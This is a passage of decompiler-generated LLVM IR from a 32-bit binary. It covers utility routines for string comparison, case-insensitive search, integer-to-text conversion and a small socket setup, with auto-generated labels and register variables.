dec_label_pc_8051e9d:                             ; preds = %dec_label_pc_8051e98
  %v1_8051e9d = load i32, i32* %esi.global-to-local, align 4
  %v3_8051e9d = add i32 %v1_8051e9d, %v0_8051ea4.pre
  %v4_8051e9d = inttoptr i32 %v3_8051e9d to i8*
  %v5_8051e9d = load i8, i8* %v4_8051e9d, align 1
  %v14_8051e9d = icmp eq i8 %v5_8051e9d, 10
  %v1_8051ea2 = icmp eq i1 %v14_8051e9d, false
  br i1 %v1_8051ea2, label %dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge, label %dec_label_pc_8051ea4

dec_label_pc_8051e9d.dec_label_pc_8051e85_crit_edge: ; preds = %dec_label_pc_8051e9d
  %v0_8051e8c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051e85

dec_label_pc_8051ea4:                             ; preds = %dec_label_pc_8051e85, %dec_label_pc_8051e98, %dec_label_pc_8051e9d
  %v0_8051ea4 = phi i32 [ %v1_8051e98, %dec_label_pc_8051e98 ], [ %v1_8051e98, %dec_label_pc_8051e9d ], [ %v0_8051ea4.pre, %dec_label_pc_8051e85 ]
  %v1_8051ea4 = icmp eq i32 %v0_8051ea4, 0
  %v1_8051ea6 = icmp eq i1 %v1_8051ea4, false
  %v0_8051eb3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051eb3 = select i1 %v1_8051ea6, i32 %v0_8051eb3, i32 0
  store i32 %v0_8051e73, i32* @ebx, align 4
  store i32 %v0_8051e71, i32* @edi, align 4
  ret i32 %v2_8051eb3

; uselistorder directives
  uselistorder i32 %v1_8051e98, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8051ea4.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8051e95, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_805238c, { 1, 0 }
  uselistorder label %dec_label_pc_8051ea4, { 2, 1, 0 }
}

define i32 @function_8051ec0() local_unnamed_addr {
dec_label_pc_8051ec0:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 16, i32* %stack_var_-12, align 4
  %v1_8051ecd = call i32 @function_8052729(i32 16)
  %v1_8051ed2 = inttoptr i32 %v1_8051ecd to i32*
  store i32 0, i32* %v1_8051ed2, align 4
  %v3_8051edf = call i32 @function_80529e5(i32 2, i32 2, i32 0)
  store i32 %v3_8051edf, i32* %esi.global-to-local, align 4
  %v10_8051eeb = icmp eq i32 %v3_8051edf, -1
  br i1 %v10_8051eeb, label %dec_label_pc_8051f32, label %dec_label_pc_8051ef0

dec_label_pc_8051ef0:                             ; preds = %dec_label_pc_8051ec0
  %v2_8051ef0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8051ef0, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8051f0f = call i32 @function_805280a(i32 %v3_8051edf, i32 %v2_8051ef0, i32 16)
  %v2_8051f17 = ptrtoint i32* %stack_var_-12 to i32
  %v0_8051f1d = load i32, i32* %esi.global-to-local, align 4
  %v3_8051f1e = call i32 @function_8052835(i32 %v0_8051f1d, i32 %v2_8051ef0, i32 %v2_8051f17)
  %v1_8051f26 = call i32 @function_80521f1(i32 %v0_8051f1d)
  br label %dec_label_pc_8051f32

dec_label_pc_8051f32:                             ; preds = %dec_label_pc_8051ec0, %dec_label_pc_8051ef0
  %v0_8051f37 = phi i32 [ 0, %dec_label_pc_8051ec0 ], [ 134744072, %dec_label_pc_8051ef0 ]
  ret i32 %v0_8051f37

; uselistorder directives
  uselistorder i32 %v3_8051edf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805280a, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_80529e5, { 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8051f32, { 1, 0 }
}

define i32 @function_8051f40(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051f40:
  %tmp18 = inttoptr i32 %arg3 to i8*
  %v2_8051f52 = load i8, i8* %tmp18, align 1
  %v3_8051f52 = icmp eq i8 %v2_8051f52, 0
  br i1 %v3_8051f52, label %dec_label_pc_8051f68, label %dec_label_pc_8051f58

dec_label_pc_8051f58:                             ; preds = %dec_label_pc_8051f40, %dec_label_pc_8051f58
  %v2_8051f58 = phi i32 [ %v1_8051f5b, %dec_label_pc_8051f58 ], [ 0, %dec_label_pc_8051f40 ]
  %v1_8051f5b = add i32 %v2_8051f58, 1
  %v2_8051f62 = add i32 %v1_8051f5b, %arg3
  %v3_8051f62 = inttoptr i32 %v2_8051f62 to i8*
  %v4_8051f62 = load i8, i8* %v3_8051f62, align 1
  %v5_8051f62 = icmp eq i8 %v4_8051f62, 0
  %v1_8051f66 = icmp eq i1 %v5_8051f62, false
  br i1 %v1_8051f66, label %dec_label_pc_8051f58, label %dec_label_pc_8051f68

dec_label_pc_8051f68:                             ; preds = %dec_label_pc_8051f58, %dec_label_pc_8051f40
  %v2_8051f9f = phi i32 [ 0, %dec_label_pc_8051f40 ], [ %v1_8051f5b, %dec_label_pc_8051f58 ]
  %v4_8051f6e = ptrtoint i8* %arg1 to i32
  %tmp25 = icmp slt i32 %arg2, 1
  br i1 %tmp25, label %dec_label_pc_8051f9c, label %dec_label_pc_8051f76.preheader

dec_label_pc_8051f76.preheader:                   ; preds = %dec_label_pc_8051f68
  %v4_8051f76.pre = load i32, i32* @ecx, align 4
  %v6_8051f78.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051f76

dec_label_pc_8051f76:                             ; preds = %dec_label_pc_8051f76.preheader, %dec_label_pc_8051f97
  %v0_8051f97 = phi i32 [ %arg2, %dec_label_pc_8051f76.preheader ], [ %v1_8051f97, %dec_label_pc_8051f97 ]
  %v6_8051f78 = phi i32 [ %v6_8051f78.pre, %dec_label_pc_8051f76.preheader ], [ %v2_8051f91, %dec_label_pc_8051f97 ]
  %v0_8051fa5 = phi i32 [ 0, %dec_label_pc_8051f76.preheader ], [ %v1_8051f788, %dec_label_pc_8051f97 ]
  %v4_8051f76 = phi i32 [ %v4_8051f76.pre, %dec_label_pc_8051f76.preheader ], [ %v0_8051f91, %dec_label_pc_8051f97 ]
  %v0_8051f7c = phi i32 [ %v4_8051f6e, %dec_label_pc_8051f76.preheader ], [ %v1_8051f7c, %dec_label_pc_8051f97 ]
  %v1_8051f76 = inttoptr i32 %v0_8051f7c to i8*
  %v2_8051f76 = load i8, i8* %v1_8051f76, align 1
  %v3_8051f76 = zext i8 %v2_8051f76 to i32
  %v5_8051f76 = and i32 %v4_8051f76, -256
  %v6_8051f76 = or i32 %v3_8051f76, %v5_8051f76
  store i32 %v6_8051f76, i32* @ecx, align 4
  %v2_8051f78 = add i32 %v0_8051fa5, %arg3
  %v3_8051f78 = inttoptr i32 %v2_8051f78 to i8*
  %v4_8051f78 = load i8, i8* %v3_8051f78, align 1
  %v5_8051f78 = zext i8 %v4_8051f78 to i32
  %v7_8051f78 = and i32 %v6_8051f78, -256
  %v8_8051f78 = or i32 %v5_8051f78, %v7_8051f78
  %v1_8051f7c = add i32 %v0_8051f7c, 1
  %v1_8051f7d = add i8 %v2_8051f76, -65
  %v8_8051f82 = icmp ugt i8 %v1_8051f7d, 25
  br i1 %v8_8051f82, label %dec_label_pc_8051f87, label %dec_label_pc_8051f84

dec_label_pc_8051f84:                             ; preds = %dec_label_pc_8051f76
  %v1_8051f84 = or i32 %v6_8051f76, 96
  store i32 %v1_8051f84, i32* @ecx, align 4
  br label %dec_label_pc_8051f87

dec_label_pc_8051f87:                             ; preds = %dec_label_pc_8051f76, %dec_label_pc_8051f84
  %v0_8051f91 = phi i32 [ %v6_8051f76, %dec_label_pc_8051f76 ], [ %v1_8051f84, %dec_label_pc_8051f84 ]
  %v1_8051f87 = add i8 %v4_8051f78, -65
  %v8_8051f8c = icmp ugt i8 %v1_8051f87, 25
  br i1 %v8_8051f8c, label %dec_label_pc_8051f91, label %dec_label_pc_8051f8e

dec_label_pc_8051f8e:                             ; preds = %dec_label_pc_8051f87
  %v1_8051f8e = or i32 %v8_8051f78, 96
  br label %dec_label_pc_8051f91

dec_label_pc_8051f91:                             ; preds = %dec_label_pc_8051f87, %dec_label_pc_8051f8e
  %v2_8051f91 = phi i32 [ %v8_8051f78, %dec_label_pc_8051f87 ], [ %v1_8051f8e, %dec_label_pc_8051f8e ]
  %v1_8051f91 = trunc i32 %v0_8051f91 to i8
  %v3_8051f91 = trunc i32 %v2_8051f91 to i8
  %v15_8051f91 = icmp eq i8 %v1_8051f91, %v3_8051f91
  br i1 %v15_8051f91, label %dec_label_pc_8051fa5, label %dec_label_pc_8051f95

dec_label_pc_8051f95:                             ; preds = %dec_label_pc_8051f91
  br label %dec_label_pc_8051f97

dec_label_pc_8051f97:                             ; preds = %dec_label_pc_8051fa5, %dec_label_pc_8051f95
  %v1_8051f788 = phi i32 [ %v1_8051fa5, %dec_label_pc_8051fa5 ], [ 0, %dec_label_pc_8051f95 ]
  %v1_8051f97 = add i32 %v0_8051f97, -1
  %tmp26 = icmp slt i32 %v1_8051f97, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_8051f76, label %dec_label_pc_8051f9c

dec_label_pc_8051f9c:                             ; preds = %dec_label_pc_8051f97, %dec_label_pc_8051f68
  store i32 %v2_8051f9f, i32* @edx, align 4
  ret i32 -1

dec_label_pc_8051fa5:                             ; preds = %dec_label_pc_8051f91
  %v1_8051fa5 = add i32 %v0_8051fa5, 1
  %v14_8051fa6 = icmp eq i32 %v2_8051f9f, %v1_8051fa5
  %v1_8051fa9 = icmp eq i1 %v14_8051fa6, false
  br i1 %v1_8051fa9, label %dec_label_pc_8051f97, label %dec_label_pc_8051fab

dec_label_pc_8051fab:                             ; preds = %dec_label_pc_8051fa5
  store i32 %v4_8051f6e, i32* @ecx, align 4
  %v2_8051fb1 = sub i32 %v1_8051f7c, %v4_8051f6e
  store i32 %v2_8051f9f, i32* @edx, align 4
  ret i32 %v2_8051fb1

; uselistorder directives
  uselistorder i32 %v1_8051f97, { 1, 0 }
  uselistorder i32 %v0_8051fa5, { 1, 0 }
  uselistorder i32 %v4_8051f6e, { 2, 1, 0 }
  uselistorder i32 %v2_8051f9f, { 2, 0, 1 }
  uselistorder i8 25, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8051f91, { 1, 0 }
  uselistorder label %dec_label_pc_8051f87, { 1, 0 }
  uselistorder label %dec_label_pc_8051f76, { 1, 0 }
  uselistorder label %dec_label_pc_8051f58, { 1, 0 }
}

define i32 @function_8051fc0() local_unnamed_addr {
dec_label_pc_8051fc0:
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %v4_8051fc2 = ptrtoint i8* %tmp13 to i32
  %v4_8051fc8 = ptrtoint i8* %tmp to i32
  %v2_8051fcc = load i8, i8* %tmp13, align 1
  %v3_8051fcc = icmp eq i8 %v2_8051fcc, 0
  br i1 %v3_8051fcc, label %dec_label_pc_8051fd8, label %dec_label_pc_8051fd1

dec_label_pc_8051fd1:                             ; preds = %dec_label_pc_8051fc0, %dec_label_pc_8051fd1
  %v0_8051fd1 = phi i32 [ %v1_8051fd1, %dec_label_pc_8051fd1 ], [ 0, %dec_label_pc_8051fc0 ]
  %v1_8051fd1 = add i32 %v0_8051fd1, 1
  %v2_8051fd2 = add i32 %v1_8051fd1, %v4_8051fc2
  %v3_8051fd2 = inttoptr i32 %v2_8051fd2 to i8*
  %v4_8051fd2 = load i8, i8* %v3_8051fd2, align 1
  %v5_8051fd2 = icmp eq i8 %v4_8051fd2, 0
  %v1_8051fd6 = icmp eq i1 %v5_8051fd2, false
  br i1 %v1_8051fd6, label %dec_label_pc_8051fd1, label %dec_label_pc_8051fd8

dec_label_pc_8051fd8:                             ; preds = %dec_label_pc_8051fd1, %dec_label_pc_8051fc0
  %v0_8051fe9 = phi i32 [ 0, %dec_label_pc_8051fc0 ], [ %v1_8051fd1, %dec_label_pc_8051fd1 ]
  %v2_8051fda = load i8, i8* %tmp, align 1
  %v3_8051fda = icmp eq i8 %v2_8051fda, 0
  br i1 %v3_8051fda, label %dec_label_pc_8051fe7, label %dec_label_pc_8051fe0

dec_label_pc_8051fe0:                             ; preds = %dec_label_pc_8051fd8, %dec_label_pc_8051fe0
  %v0_8051fe0 = phi i32 [ %v1_8051fe0, %dec_label_pc_8051fe0 ], [ 0, %dec_label_pc_8051fd8 ]
  %v1_8051fe0 = add i32 %v0_8051fe0, 1
  %v2_8051fe1 = add i32 %v1_8051fe0, %v4_8051fc8
  %v3_8051fe1 = inttoptr i32 %v2_8051fe1 to i8*
  %v4_8051fe1 = load i8, i8* %v3_8051fe1, align 1
  %v5_8051fe1 = icmp eq i8 %v4_8051fe1, 0
  %v1_8051fe5 = icmp eq i1 %v5_8051fe1, false
  br i1 %v1_8051fe5, label %dec_label_pc_8051fe0, label %dec_label_pc_8051fe7

dec_label_pc_8051fe7:                             ; preds = %dec_label_pc_8051fe0, %dec_label_pc_8051fd8
  %v0_8051fe7 = phi i32 [ 0, %dec_label_pc_8051fd8 ], [ %v1_8051fe0, %dec_label_pc_8051fe0 ]
  store i32 %v0_8051fe7, i32* @edx, align 4
  %v12_8051fe9 = icmp eq i32 %v0_8051fe9, %v0_8051fe7
  br i1 %v12_8051fe9, label %dec_label_pc_8051ff4.preheader, label %dec_label_pc_8051fed

dec_label_pc_8051ff4.preheader:                   ; preds = %dec_label_pc_8051fe7
  %v1_8051ff417 = add i32 %v0_8051fe9, -1
  store i32 %v1_8051ff417, i32* @edx, align 4
  %v10_8051ff518 = icmp eq i32 %v0_8051fe9, 0
  br i1 %v10_8051ff518, label %dec_label_pc_8052002, label %dec_label_pc_8051ffa

dec_label_pc_8051fed:                             ; preds = %dec_label_pc_8051ffa, %dec_label_pc_8051fe7
  ret i32 0

dec_label_pc_8051ff2:                             ; preds = %dec_label_pc_8051ffa
  %v3_8051ffa = zext i8 %v2_8051ffa to i32
  %v5_8051ffa = and i32 %v4_8051ffa20, -256
  %v6_8051ffa = or i32 %v3_8051ffa, %v5_8051ffa
  %v1_8051ff2 = add i32 %v0_8051ff221, 1
  %v1_8051ff3 = add i32 %v0_8051ff319, 1
  %v1_8051ff4 = add i32 %v1_8051ff422, -1
  store i32 %v1_8051ff4, i32* @edx, align 4
  %v10_8051ff5 = icmp eq i32 %v1_8051ff422, 0
  br i1 %v10_8051ff5, label %dec_label_pc_8052002, label %dec_label_pc_8051ffa

dec_label_pc_8051ffa:                             ; preds = %dec_label_pc_8051ff4.preheader, %dec_label_pc_8051ff2
  %v1_8051ff422 = phi i32 [ %v1_8051ff4, %dec_label_pc_8051ff2 ], [ %v1_8051ff417, %dec_label_pc_8051ff4.preheader ]
  %v0_8051ff221 = phi i32 [ %v1_8051ff2, %dec_label_pc_8051ff2 ], [ %v4_8051fc2, %dec_label_pc_8051ff4.preheader ]
  %v4_8051ffa20 = phi i32 [ %v6_8051ffa, %dec_label_pc_8051ff2 ], [ %v0_8051fe9, %dec_label_pc_8051ff4.preheader ]
  %v0_8051ff319 = phi i32 [ %v1_8051ff3, %dec_label_pc_8051ff2 ], [ %v4_8051fc8, %dec_label_pc_8051ff4.preheader ]
  %v1_8051ffa = inttoptr i32 %v0_8051ff221 to i8*
  %v2_8051ffa = load i8, i8* %v1_8051ffa, align 1
  %v3_8051ffc = inttoptr i32 %v0_8051ff319 to i8*
  %v4_8051ffc = load i8, i8* %v3_8051ffc, align 1
  %v15_8051ffc = icmp eq i8 %v2_8051ffa, %v4_8051ffc
  br i1 %v15_8051ffc, label %dec_label_pc_8051ff2, label %dec_label_pc_8051fed

dec_label_pc_8052002:                             ; preds = %dec_label_pc_8051ff2, %dec_label_pc_8051ff4.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_8051ff422, { 1, 0 }
  uselistorder i32 %v0_8051fe9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8051ffa, { 1, 0 }
  uselistorder label %dec_label_pc_8051fe0, { 1, 0 }
  uselistorder label %dec_label_pc_8051fd1, { 1, 0 }
}

define i32 @function_8052010() local_unnamed_addr {
dec_label_pc_8052010:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i8* @__decompiler_undefined_function_2()
  %tmp14 = call i8* @__decompiler_undefined_function_2()
  %v4_8052012 = ptrtoint i8* %tmp14 to i32
  %v4_8052018 = ptrtoint i8* %tmp13 to i32
  %v2_8052020 = load i8, i8* %tmp14, align 1
  %v3_8052020 = icmp eq i8 %v2_8052020, 0
  br i1 %v3_8052020, label %dec_label_pc_805202c, label %dec_label_pc_8052025

dec_label_pc_8052025:                             ; preds = %dec_label_pc_8052010, %dec_label_pc_8052025
  %v0_8052025 = phi i32 [ %v1_8052025, %dec_label_pc_8052025 ], [ 0, %dec_label_pc_8052010 ]
  %v1_8052025 = add i32 %v0_8052025, 1
  %v2_8052026 = add i32 %v1_8052025, %v4_8052012
  %v3_8052026 = inttoptr i32 %v2_8052026 to i8*
  %v4_8052026 = load i8, i8* %v3_8052026, align 1
  %v5_8052026 = icmp eq i8 %v4_8052026, 0
  %v1_805202a = icmp eq i1 %v5_8052026, false
  br i1 %v1_805202a, label %dec_label_pc_8052025, label %dec_label_pc_805202c

dec_label_pc_805202c:                             ; preds = %dec_label_pc_8052025, %dec_label_pc_8052010
  %v1_805203a = phi i32 [ 0, %dec_label_pc_8052010 ], [ %v1_8052025, %dec_label_pc_8052025 ]
  %v2_805202e = load i8, i8* %tmp13, align 1
  %v3_805202e = icmp eq i8 %v2_805202e, 0
  br i1 %v3_805202e, label %dec_label_pc_805203a, label %dec_label_pc_8052033

dec_label_pc_8052033:                             ; preds = %dec_label_pc_805202c, %dec_label_pc_8052033
  %v0_8052033 = phi i32 [ %v1_8052033, %dec_label_pc_8052033 ], [ 0, %dec_label_pc_805202c ]
  %v1_8052033 = add i32 %v0_8052033, 1
  %v2_8052034 = add i32 %v1_8052033, %v4_8052018
  %v3_8052034 = inttoptr i32 %v2_8052034 to i8*
  %v4_8052034 = load i8, i8* %v3_8052034, align 1
  %v5_8052034 = icmp eq i8 %v4_8052034, 0
  %v1_8052038 = icmp eq i1 %v5_8052034, false
  br i1 %v1_8052038, label %dec_label_pc_8052033, label %dec_label_pc_805203a

dec_label_pc_805203a:                             ; preds = %dec_label_pc_8052033, %dec_label_pc_805202c
  %v1_805203e = phi i32 [ 0, %dec_label_pc_805202c ], [ %v1_8052033, %dec_label_pc_8052033 ]
  %v8_805203c = icmp sgt i32 %tmp, %v1_805203a
  br i1 %v8_805203c, label %dec_label_pc_8052042, label %dec_label_pc_805203e

dec_label_pc_805203e:                             ; preds = %dec_label_pc_805203a
  %v7_8052040 = icmp sgt i32 %tmp, %v1_805203e
  br i1 %v7_8052040, label %dec_label_pc_8052042, label %dec_label_pc_8052049.preheader

dec_label_pc_8052049.preheader:                   ; preds = %dec_label_pc_805203e
  %v10_805204a19 = icmp eq i32 %tmp, 0
  br i1 %v10_805204a19, label %dec_label_pc_8052044, label %dec_label_pc_805204f

dec_label_pc_8052042:                             ; preds = %dec_label_pc_805204f, %dec_label_pc_805203e, %dec_label_pc_805203a
  br label %dec_label_pc_8052044

dec_label_pc_8052044:                             ; preds = %dec_label_pc_8052049.preheader, %dec_label_pc_8052047, %dec_label_pc_8052042
  %storemerge = phi i32 [ 0, %dec_label_pc_8052042 ], [ 1, %dec_label_pc_8052047 ], [ 1, %dec_label_pc_8052049.preheader ]
  ret i32 %storemerge

dec_label_pc_8052047:                             ; preds = %dec_label_pc_805204f
  %v3_805204f = zext i8 %v2_805204f to i32
  %v5_805204f = and i32 %v4_805204f21, -256
  %v6_805204f = or i32 %v3_805204f, %v5_805204f
  %v1_8052047 = add i32 %v0_805204722, 1
  %v1_8052048 = add i32 %v0_805204820, 1
  %v10_805204a = icmp eq i32 %v1_805204923, 0
  br i1 %v10_805204a, label %dec_label_pc_8052044, label %dec_label_pc_805204f

dec_label_pc_805204f:                             ; preds = %dec_label_pc_8052049.preheader, %dec_label_pc_8052047
  %v1_805204923.in = phi i32 [ %v1_805204923, %dec_label_pc_8052047 ], [ %tmp, %dec_label_pc_8052049.preheader ]
  %v0_805204722 = phi i32 [ %v1_8052047, %dec_label_pc_8052047 ], [ %v4_8052012, %dec_label_pc_8052049.preheader ]
  %v4_805204f21 = phi i32 [ %v6_805204f, %dec_label_pc_8052047 ], [ %v1_805203e, %dec_label_pc_8052049.preheader ]
  %v0_805204820 = phi i32 [ %v1_8052048, %dec_label_pc_8052047 ], [ %v4_8052018, %dec_label_pc_8052049.preheader ]
  %v1_805204923 = add i32 %v1_805204923.in, -1
  %v1_805204f = inttoptr i32 %v0_805204722 to i8*
  %v2_805204f = load i8, i8* %v1_805204f, align 1
  %v3_8052051 = inttoptr i32 %v0_805204820 to i8*
  %v4_8052051 = load i8, i8* %v3_8052051, align 1
  %v15_8052051 = icmp eq i8 %v2_805204f, %v4_8052051
  br i1 %v15_8052051, label %dec_label_pc_8052047, label %dec_label_pc_8052042

; uselistorder directives
  uselistorder label %dec_label_pc_805204f, { 1, 0 }
  uselistorder label %dec_label_pc_8052044, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052033, { 1, 0 }
  uselistorder label %dec_label_pc_8052025, { 1, 0 }
}

define i32 @function_8052060(i64 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052060:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp25 = inttoptr i32 %arg3 to i8*
  %stack_var_-64 = alloca i32, align 4
  %v12_8052064 = ptrtoint i32* %stack_var_-64 to i32
  %v4_805206b = trunc i64 %arg1 to i32
  store i32 %v4_805206b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v2_8052073 = icmp eq i32 %arg3, 0
  br i1 %v2_8052073, label %dec_label_pc_80520e0, label %dec_label_pc_8052077

dec_label_pc_8052077:                             ; preds = %dec_label_pc_8052060
  %v2_8052077 = icmp eq i32 %v4_805206b, 0
  %v3_8052077 = icmp slt i32 %v4_805206b, 0
  br i1 %v2_8052077, label %dec_label_pc_80520f0, label %dec_label_pc_805207b

dec_label_pc_805207b:                             ; preds = %dec_label_pc_8052077
  %v9_8052080 = icmp eq i32 %arg2, 10
  br i1 %v9_8052080, label %dec_label_pc_805210d, label %dec_label_pc_8052089

dec_label_pc_8052089:                             ; preds = %dec_label_pc_805210d, %dec_label_pc_805207b
  br label %dec_label_pc_805208d

dec_label_pc_805208d:                             ; preds = %dec_label_pc_8052115, %dec_label_pc_8052089
  %storemerge35 = phi i32 [ %v4_805206b, %dec_label_pc_8052089 ], [ %v1_8052117, %dec_label_pc_8052115 ]
  %v0_80520945 = phi i32 [ %v4_805206b, %dec_label_pc_8052089 ], [ %v1_8052117, %dec_label_pc_8052115 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8052089 ], [ 1, %dec_label_pc_8052115 ]
  store i32 %storemerge35, i32* %ecx.global-to-local, align 4
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  store i32 32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052092

dec_label_pc_8052092:                             ; preds = %dec_label_pc_8052092.dec_label_pc_8052092_crit_edge, %dec_label_pc_805208d
  %v2_80520a3 = phi i32 [ %v2_80520a3.pre, %dec_label_pc_8052092.dec_label_pc_8052092_crit_edge ], [ %v12_8052064, %dec_label_pc_805208d ]
  %v3_80520a3 = phi i32 [ %v1_80520ab, %dec_label_pc_8052092.dec_label_pc_8052092_crit_edge ], [ 32, %dec_label_pc_805208d ]
  %v0_8052096 = phi i32 [ %v0_80520ac, %dec_label_pc_8052092.dec_label_pc_8052092_crit_edge ], [ %arg2, %dec_label_pc_805208d ]
  %v0_8052094 = phi i32 [ %div20, %dec_label_pc_8052092.dec_label_pc_8052092_crit_edge ], [ %v0_80520945, %dec_label_pc_805208d ]
  %tmp32 = urem i32 %v0_8052094, %v0_8052096
  %v7_805209e = icmp sgt i32 %tmp32, 9
  %v1_80520a0.v1_805209b.v = select i1 %v7_805209e, i32 55, i32 48
  %v1_80520a0.v1_805209b = add i32 %v1_80520a0.v1_805209b.v, %tmp32
  %v1_80520a3 = trunc i32 %v1_80520a0.v1_805209b to i8
  %v4_80520a3 = add i32 %v3_80520a3, 14
  %v5_80520a3 = add i32 %v4_80520a3, %v2_80520a3
  %v6_80520a3 = inttoptr i32 %v5_80520a3 to i8*
  store i8 %v1_80520a3, i8* %v6_80520a3, align 1
  %v0_80520a9 = load i32, i32* %ecx.global-to-local, align 4
  %v0_80520ab = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520ab = add i32 %v0_80520ab, -1
  store i32 %v1_80520ab, i32* %ebx.global-to-local, align 4
  %v0_80520ac = load i32, i32* %esi.global-to-local, align 4
  %div20 = udiv i32 %v0_80520a9, %v0_80520ac
  store i32 %div20, i32* %eax.global-to-local, align 4
  %tmp33 = urem i32 %v0_80520a9, %v0_80520ac
  store i32 %tmp33, i32* %edx.global-to-local, align 4
  store i32 %div20, i32* %ecx.global-to-local, align 4
  %v1_80520b0 = icmp ugt i32 %v0_80520ac, %v0_80520a9
  %v1_80520b2 = icmp eq i1 %v1_80520b0, false
  br i1 %v1_80520b2, label %dec_label_pc_8052092.dec_label_pc_8052092_crit_edge, label %dec_label_pc_80520b4

dec_label_pc_8052092.dec_label_pc_8052092_crit_edge: ; preds = %dec_label_pc_8052092
  %v2_80520a3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052092

dec_label_pc_80520b4:                             ; preds = %dec_label_pc_8052092
  %v0_80520b4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80520b4 = icmp eq i32 %v0_80520b4, 0
  %v1_80520b6 = icmp eq i1 %v1_80520b4, false
  br i1 %v1_80520b6, label %dec_label_pc_8052106, label %dec_label_pc_80520b8

dec_label_pc_80520b8:                             ; preds = %dec_label_pc_80520b4
  store i32 %v0_80520ab, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80520b9

dec_label_pc_80520b9:                             ; preds = %dec_label_pc_8052106, %dec_label_pc_80520b8
  %v1_80520b9 = phi i32 [ %v1_80520b9.pre, %dec_label_pc_8052106 ], [ %v0_80520ab, %dec_label_pc_80520b8 ]
  %v0_80520b9 = load i32, i32* @esp, align 4
  %v2_80520b9 = add i32 %v1_80520b9, 14
  %v3_80520b9 = add i32 %v2_80520b9, %v0_80520b9
  store i32 %v3_80520b9, i32* %eax.global-to-local, align 4
  %v1_80520bd = inttoptr i32 %v3_80520b9 to i8*
  %v2_80520bd = load i8, i8* %v1_80520bd, align 1
  %v3_80520bd = icmp eq i8 %v2_80520bd, 0
  br i1 %v3_80520bd, label %dec_label_pc_8052125, label %dec_label_pc_80520c2

dec_label_pc_80520c2:                             ; preds = %dec_label_pc_80520b9
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80520c4

dec_label_pc_80520c4:                             ; preds = %dec_label_pc_80520c4, %dec_label_pc_80520c2
  %v0_80520c4 = phi i32 [ %v1_80520c4, %dec_label_pc_80520c4 ], [ 0, %dec_label_pc_80520c2 ]
  %v1_80520c4 = add i32 %v0_80520c4, 1
  store i32 %v1_80520c4, i32* %ecx.global-to-local, align 4
  %v2_80520c5 = add i32 %v1_80520c4, %v3_80520b9
  %v3_80520c5 = inttoptr i32 %v2_80520c5 to i8*
  %v4_80520c5 = load i8, i8* %v3_80520c5, align 1
  %v5_80520c5 = icmp eq i8 %v4_80520c5, 0
  %v1_80520c9 = icmp eq i1 %v5_80520c5, false
  br i1 %v1_80520c9, label %dec_label_pc_80520c4, label %dec_label_pc_80520cb

dec_label_pc_80520cb:                             ; preds = %dec_label_pc_80520c4
  %v10_80520cb = icmp eq i32 %v0_80520c4, -2
  br i1 %v10_80520cb, label %dec_label_pc_80520e0, label %dec_label_pc_80520d0

dec_label_pc_80520d0:                             ; preds = %dec_label_pc_80520cb
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  store i32 %v3_80520b9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80520d4

dec_label_pc_80520d4:                             ; preds = %dec_label_pc_8052125, %dec_label_pc_80520d0, %dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge
  %v2_80520d7 = phi i32 [ %v1_80520da, %dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge ], [ %arg3, %dec_label_pc_80520d0 ], [ %arg3, %dec_label_pc_8052125 ]
  %v0_80520d6 = phi i32 [ %v0_80520db, %dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge ], [ %v1_80520c4, %dec_label_pc_80520d0 ], [ 0, %dec_label_pc_8052125 ]
  %v4_80520d4 = phi i32 [ %v4_80520d4.pre, %dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge ], [ %v3_80520b9, %dec_label_pc_80520d0 ], [ %v3_80520b9, %dec_label_pc_8052125 ]
  %v0_80520d4 = phi i32 [ %v1_80520d9, %dec_label_pc_80520d4.dec_label_pc_80520d4_crit_edge ], [ %v3_80520b9, %dec_label_pc_80520d0 ], [ %v3_80520b9, %dec_label_pc_8052125 ]
  %v1_80520d4 = inttoptr i32 %v0_80520d4 to i8*
  %v2_80520d4 = load i8, i8* %v1_80520d4, align 1
  %v3_80520d4 = zext i8 %v2_80520d4 to i32
